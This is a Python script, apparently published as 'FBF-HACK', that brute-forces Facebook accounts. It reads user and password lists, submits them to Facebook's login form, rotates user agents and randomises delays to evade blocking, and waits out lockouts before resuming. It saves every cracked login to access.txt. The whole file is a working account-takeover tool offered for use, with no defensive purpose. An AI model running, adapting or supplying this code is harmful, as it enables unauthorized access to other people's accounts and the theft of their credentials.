#!/usr/bin/python3
#Created by : Mahmoud khalid
#FB profil : https://www.facebook.com/mahmoud.banzema.1
#Running on python3
#Use help command for display help menu
#For execute script use this command in terminal 'python3 FBF-HACK.py' not './FBF-HACK.py'

from sys import version
pyversion = version
if int(pyversion.split('.')[0]) != 3:
	print("[-] Failed, You have python verison {}, FBF-HACK running on python3 or more".format(pyversion[:3]))
	exit()
try:
	from platform import system
	from time import sleep,ctime
	from random import randrange
	import mechanicalsoup
except:
	print("[-] Failed mechanicalsoup not installed")
	OS = system()
	if OS == 'Windows':
			print("[+] Must install mechanicalsoup library for Windows OS")
			print(" -  Open CMD and use this command 'C:\Python{}\Scripts\pip.exe install MechanicalSoup'".format(pyversion[:3].replace(".", '')))
			exit()
	elif OS == 'Linux':
			print("[+] Must install mechanicalsoup library for Linux OS")
			print(" -  Open terminal and use this command 'apt install python3-mechanicalsoup'")
			exit()
	else:
			print("[+] Visit site : http://mechanicalsoup.readthedocs.io/en/stable/introduction.html")
			exit()
			

userslist = ['USER','']
passwordtxt = ['PASSWORD','passwords.txt']
timernextup = ['TIMERNEXTUP',30]
blockedtimer = ['BLOCKEDTIMER',30]
typical = ['TYPICAL','DISABLE']
#agents = [
#'Opera/9.80 (Android; Opera Mini/19.0.2254/37.9031; U; en) Presto/2.12.423 Version/12.16',
#'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
#'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36',
#'Opera/9.80 (Android; Opera Mini/20.0.2254/37.9093; U; en) Presto/2.12.423 Version/12.16',
#'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E188a Safari/601.1',
#'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36',
#'Opera/9.80 (Android; Opera Mini/24.0.2254/60.313; U; en) Presto/2.12.423 Version/12.16',
#'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.1',
#'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
#'Mozilla/5.0 (Linux; U; Android 4.1.2; he-il; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
#'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/FBIOS;FBAV/59.0.0.51.142;FBBV/33266808;FBRV/0;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/3;FBCR/Telkomsel;FBID/phone;FBLC/en_US;FBOP/5]',
#'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15',
#'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.3.0',
#'Mozilla/5.0 (SMART-TV; X11; Linux armv7l) AppleWebKit/537.42 (KHTML, like Gecko) Chromium/25.0.1349.2 Chrome/25.0.1349.2 Safari/537.42',
#'Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1 (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1'
#]

	
def banner():
	print("""
           _______  ____  __ _____  _______ __
          / __/ _ )/ __/ / // / _ |/ ___/ //_/
         / _// _  / _/  / _  / __ / /__/ ,<   
        /_/ /____/_/   /_//_/_/ |_\___/_/|_|  
									  
                --- [ FBF HACK ] ---
          --( Facebook Brute Force HACK )--
             Created By : Mahmoud Khalid
          FB Profile : FB/mahmoud.banzema.1
""")

def helpmenu():
	print("-"*55)
	print("{:<25}{}".format('COMMANDS','DESCRIPTION'))
	print("-"*55)
	print("{:<25}{}".format('SET',"Edit any option, for display it use 'OPTIONS' command"))
	print("{:<25}{}".format('OPTIONS',"Display use options"))
	print("{:<25}{}".format('RUN',"Running tool"))
	print("{:<25}{}".format('HELP',"Display helper menu"))
	print("{:<25}{}".format('EXIT',"Leave program"))
	
def options():
	print("-"*80)
	print("{:<25}{:<25}{:<10}{}".format('NAME','SETTING','REQUIRED','DESCRIPTION'))
	print("-"*80)
	print("{:<25}{:<25}{:<10}{}".format(userslist[0],userslist[1],'YES',"Set a users list file .txt or single user"))
	print("{:<25}{:<25}{:<10}{}".format(passwordtxt[0],passwordtxt[1],'YES',"Set a pass list file .txt or single password (Defualt : passwords.txt)"))
	print("{:<25}{:<25}{:<10}{}".format(timernextup[0],timernextup[1],'NO',"Number of seconds to new retry + 30 random sec (Default : 30 sec)"))
	print("{:<25}{:<25}{:<10}{}".format(blockedtimer[0],blockedtimer[1],'NO',"Number of minutes for sleeping in case of blocked (Default : 30 min)"))
	print("{:<25}{:<25}{:<10}{}".format(typical[0],typical[1],'NO',"Ignore password option and replace it with user account\n"))
	print("-"*55)
	print("{:<9}: 'YES' Required can't be change to DISABLE".format('[!] NOTE '))
	print("{:<9}: 'NO' Required can be change to DISABLE EX: 'SET TIMERNEXTUP DISABLE'".format(' '))
	print("{:<9}:  Recommended don't disable any option so as not to be block account".format(' '))
	
def set(name,setting):
	if name.upper() == userslist[0]:
		if setting.lower() != 'disable':
			userslist[1] = setting
			print("SET {} ==> {}".format(userslist[0],userslist[1]))
	elif name.upper() == passwordtxt[0]:
		if setting.lower() != 'disable':
			passwordtxt[1] = setting
			print("SET {} ==> {}".format(passwordtxt[0],passwordtxt[1]))
	elif name.upper() == timernextup[0]:
		if setting.lower() == 'disable' or str(setting).isdigit() == True:
			timernextup[1] = setting
			print("SET {} ==> {}".format(timernextup[0],timernextup[1]))
	elif name.upper() == blockedtimer[0]:
		if setting.lower() == 'disable' or str(setting).isdigit() == True:
			blockedtimer[1] = setting
			print("SET {} ==> {}".format(blockedtimer[0],blockedtimer[1]))
	elif name.upper() == typical[0]:
		if setting.lower() in ['disable','enable']:
			typical[1] = setting.upper()
			print("SET {} ==> {}".format(typical[0],typical[1]))
	else:
		print("[-] This command is not found !")
		
def run(emails,passlist,timernextupfun,blockedtimerfun,typicalstatus):
	try:
		if passlist.endswith('.txt') == True and typical[1].lower() == 'disable':
			passfile = open(passlist,"r")
			passwordslist = passfile.readlines()
			lenghtpassowrdslist = len(passwordslist)
			print("[+] Successfully readed {} file".format(passlist))
		else:
			passwordslist = passlist.split()
			lenghtpassowrdslist = len(passwordslist)
	except:
		print("[-] Failed read {} file is not found".format(passlist))
		return;
		
	try:
		agents = open('agents.txt','r').readlines()
		#print(agents)
		#print(len(agents))
		print("[+] Successfully readed agents.txt file")
	except:
		print("[+] Failed read agents.txt file")
		return;

	try:
		if emails.endswith('.txt') == True:
			emailfile = open(emails,'r')
			userslist = emailfile.readlines()
			lenghtuserslist = len(userslist)
			print("[+] Successfully readed {} file".format(emails))
		else:
			userslist = emails.split()
			lenghtuserslist = len(userslist)
	except:
		print("[-] Failed read {} file is not found".format(emails))
		return;

	try:
		browser = mechanicalsoup.Browser()
		try:
			browser.session.headers.update({'User-Agent': agents[randrange(1,2500)].strip('\n')})
			login_page = browser.get("https://en-gb.facebook.com/login.php?login_attempt=1&lwv=100")
			login_form = login_page.soup.select("#login_form")[0]
			print("[+] Successfully facebook connection")
		except:
			print("[-] Failed facebook connection !")
			return;

		tryinguser = 1
		for email in userslist:
			if email in ['',' ','\n']:
					continue;
			login_page.request.headers.update({'User-Agent': agents[randrange(1,2500)].strip('\n')})
			#print("[!] Debuger agents : {}".format(login_page.request.headers))							#Debuger
			email = email.rstrip("\n")
			print("\n[+] {}/{} Started FBF-HACK attack on {}".format(tryinguser,lenghtuserslist,email))
			tryingpass = 1
			for passwd in passwordslist:
				if typicalstatus.lower() == 'enable':
					passwd = email
				if passwd in ['',' ','\n']:
					continue;
				passwd = passwd.rstrip("\n")
				login_form.select("#email")[0]['value'] = email
				login_form.select("#pass")[0]['value'] = passwd
				page = browser.submit(login_form, login_page.url)
				urlstatus = str(page.url)
				print("[+] Get URL : {}".format(urlstatus))
				if 'checkpoint' in urlstatus:
					getsetting = False
				elif 'login' not in urlstatus or '=100' not in urlstatus:
					getsetting = True
				else:
					getsetting = None
					
				signupcounter = 1
				print("[+] {}/{} - Trying password : {}".format(tryingpass,lenghtpassowrdslist,passwd))
				for onetext in page.soup.findAll("div"):
					gettext = onetext.text
					#print("[!] Debuger response : {}".format(gettext))										#Debuger
					if "Please try again later" in gettext:
							print("#{} Warnning {} {}#".format('-'*16,ctime(),'-'*16))
							print("# [!] Your bruteforce attack is Blocked !{}#".format(' '*27))
							if blockedtimerfun.isdigit() == True:
								print("# [+] sleeping {} minutes and then continue again...{}#".format(blockedtimerfun,' '*16))
								print("#"*70)
								sleep(int(blockedtimerfun)*60)
							else:
								print("#"*70)
							break;
					elif "Sign Up" in gettext:
						signupcounter += 1

				#print("[!] Debuger signup : {}".format(signupcounter))
				if getsetting != None:
					print("[+] Success login account {}, password = {}, status = {}".format(email,passwd,getsetting))
					saving = open('access.txt','a')
					saving.write("[+] Success login account {}, password = {}, status = {} at {}\n".format(email,passwd,getsetting,ctime()))
					print("[+] Finished bruteforce attack at {} saving to access.txt".format(ctime()))
					break;
				else:
					print("[-] Failed login account")
				tryingpass += 1
				if typicalstatus.lower() == 'enable':
					break;
				if timernextupfun.isdigit() == True and tryingpass < lenghtpassowrdslist:
					randomtime = randrange(int(timernextupfun),int(timernextupfun)+30)
					print("[+] Next up trying after {} seconds".format(str(randomtime)))
					sleep(int(randomtime))
			tryinguser += 1
	except:
		pass;

#main script here
banner()
print("[+] Use help for help menu")
while True:
	try:
		shell = input("\nFBF-HACK@Shell~$:  ").split(' ')
	except:
		print("\n[!] See you later, Bye..")
		break;
	if shell[0].lower() in ['set','help','options','run','exit']:
		if shell[0].lower() == "set" and len(shell) == 3:
			set(shell[1],shell[2])
		elif shell[0].lower() == "help":
			helpmenu()
		elif shell[0].lower() == "options":
			options()
		elif shell[0].lower() == "exit":
			print("[!] See you later, Bye..")
			exit()
		elif shell[0].lower() == "run":
			spaceinput = ['',' ']
			if userslist[1] not in spaceinput and passwordtxt[1] not in spaceinput:
				run(str(userslist[1]),str(passwordtxt[1]),str(timernextup[1]),str(blockedtimer[1]),str(typical[1]))
			else:
				print("[-] USER / PASSWORD not found !")
		else:
			print("[-] This command is not found !")
	else:
		if shell[0] == '':
			continue;
		else:
			print("[-] This command is not found !")
